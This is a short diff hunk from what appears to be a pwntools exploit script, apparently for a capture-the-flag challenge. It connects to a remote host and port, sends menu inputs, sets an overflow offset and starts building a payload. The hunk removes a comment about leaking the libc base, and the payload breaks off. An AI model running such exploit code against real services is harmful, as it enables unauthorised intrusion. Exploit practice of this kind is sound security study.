@@ -12,7 +12,6 @@ p = remote("34.76.206.46", 10005)
 p.sendlineafter(b"your name: ", b"Ramesh")
 p.sendlineafter(b"what you would like to do: ", b"2")
 
-# First, leak libc base and rebase libc
 OFFSET = 120
 
 payload = flat(
